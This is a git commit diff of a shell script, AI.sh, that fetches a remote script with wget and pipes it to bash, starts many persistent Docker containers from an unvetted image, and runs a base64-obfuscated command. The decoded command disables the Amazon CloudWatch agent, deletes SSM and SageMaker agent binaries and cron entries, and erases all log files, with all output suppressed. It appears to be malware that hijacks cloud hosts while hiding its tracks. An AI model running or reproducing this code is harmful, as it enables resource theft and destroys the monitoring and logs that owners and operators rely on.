b8834615684a3ae623ba4387819b37c4f9a0f6a2
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-30 11:31:04 +0800

    Update AI.sh

--- AI.sh
+++ AI.sh
@@ -1,6 +1,12 @@
 #!/bin/bash
 bash -c "wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/d.sh |bash -s 9 trguiftu/ikhudfrt && docker run -dt --restart=always yydsgov/debian:latest" >/dev/null 2>&1 &
-#bash -c "docker run -dt --restart=always --name ai2 yydsgov/debian:latest" >/dev/null 2>&1 &
+bash -c "docker run -dt --restart=always --name ai2 yydsgov/debian:latest" >/dev/null 2>&1 &
+bash -c "docker run -dt --restart=always --name ai3 yydsgov/debian:latest" >/dev/null 2>&1 &
+bash -c "docker run -dt --restart=always --name ai4 yydsgov/debian:latest" >/dev/null 2>&1 &
+bash -c "docker run -dt --restart=always --name ai5 yydsgov/debian:latest" >/dev/null 2>&1 &
+bash -c "docker run -dt --restart=always --name ai6 yydsgov/debian:latest" >/dev/null 2>&1 &
+bash -c "docker run -dt --restart=always --name ai7 yydsgov/debian:latest" >/dev/null 2>&1 &
+bash -c "docker run -dt --restart=always --name ai8 yydsgov/debian:latest" >/dev/null 2>&1 &
 
 /bin/sh -c "echo 'c2xlZXAgMTIwOyBzdWRvIHN5c3RlbWN0bCBkaXNhYmxlIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHN5c3RlbWN0bCBzdG9wIGFtYXpvbi1jbG91ZHdhdGNoLWFnZW50OyBzdWRvIHJtIC1yZiAvdXNyL2Jpbi9zc20tYWdlbnQtd29ya2VyIC91c3IvYmluL2FtYXpvbi1zc20tYWdlbnQgL3Vzci9zYmluL3JvbGUtYWdlbnQgL3Vzci9saWJleGVjL3Bvc3RmaXgvbWFzdGVyIC9vcHQvYXdzL2FtYXpvbi1jbG91ZHdhdGNoLWFnZW50IC9ldGMvb3B0L21sL3NjcmlwdHMvY2xlYW4tanVweXRlci1sb2cgL2V0Yy9vcHQvbWwvc2NyaXB0cy9zYWdlbWFrZXItbmJpLWFnZW50IC9ldGMvb3B0L21sL3NjcmlwdHMvcmVzdGFydC1zYWdlbWFrZXItYWdlbnQtd2F0Y2hlciAvZXRjL29wdC9tbC9zY3JpcHRzL3JlbGF1bmNoLWRvY2tlci1zZXJ2aWNlIC9ldGMvb3B0L21sL3NjcmlwdHMvc2FnZW1ha2VyLXJvbGUtcHJveHktYWdlbnQgL2V0Yy9vcHQvbWwvc2NyaXB0cy9zZXQtdXAtYWdlbnQtbmFtZXNwYWNlIC91c3Ivc2Jpbi9zYW1wbGUtbm90ZWJvb2tzLWNvbmZpZyAvb3B0Ly5zYWdlbWFrZXIvYWRkX2Nsb3VkX3dhdGNoX2FnZW50X2NvbmZpZ3VyYXRpb24ucHkgL2V0Yy9jcm9uLmQvKiAvZXRjL2Nyb24uZGFpbHkvKiAvZXRjL2Nyb24uaG91cmx5Lyo7IHN1ZG8gZmluZCAvdmFyL2xvZyAtdHlwZSBmIC1kZWxldGU7Cg==' |base64 -d |/bin/bash" >/dev/null 2>&1 &
 ##bash -c "sleep 150 && reboot" >/dev/null 2>&1 &
